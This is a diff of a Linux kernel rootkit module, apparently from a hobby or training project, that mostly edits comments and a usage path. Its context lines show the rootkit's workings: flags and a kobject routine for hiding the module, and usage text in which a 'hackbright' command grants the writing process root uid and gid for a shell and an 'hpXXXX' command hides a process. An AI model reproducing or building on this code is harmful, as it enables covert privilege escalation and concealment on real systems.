@@ -4,7 +4,7 @@
 #include <linux/fs.h>
 #include <linux/cred.h>
 #include <linux/string.h>
-
+/* WTF */
 #define MIN(a,b) \
    ({ typeof (a) _a = (a); \
       typeof (b) _b = (b); \
@@ -44,7 +44,7 @@ static int current_pid = 0;
 static char hidden_files = 1;
 static char hidden_module = 0;
 
-/* module status array */
+/* module status array -- provides a method of printing */
 static char module_status[1024];
 
 /* MODULE FUNCTIONS */
@@ -74,8 +74,8 @@ void show_module(void) {
 
 	restore = kobject_add(&THIS_MODULE->mkobj.kobj, 	/* restores kobject */
 						 THIS_MODULE->mkobj.kobj.parent, "rt");
-	/* WTF */
-	hidden_module = !hidden_module;					/* resets module switch */
+
+	hidden_module = !hidden_module;					/* sets module switch to 0*/
 }
 
 /* PAGE READ/WRITE FUNCTIONS */ /* WTF */
@@ -145,7 +145,7 @@ USAGE:\n\
   To get root access, give the \"hackbright\" command and 
   then fork some shell from writing process.\n
   rtcmd.py does this if the second parameter is specified. --\n\
-  $ tools/rtcmd.py hackbright /bin/bash\n\n\
+  $ ./rtcmd.py hackbright /bin/bash\n\n\
 COMMANDS:\n\
   hackbright	- uid and gid 0 for writing process\n\
   hpXXXX		- hides process id XXXX\n\
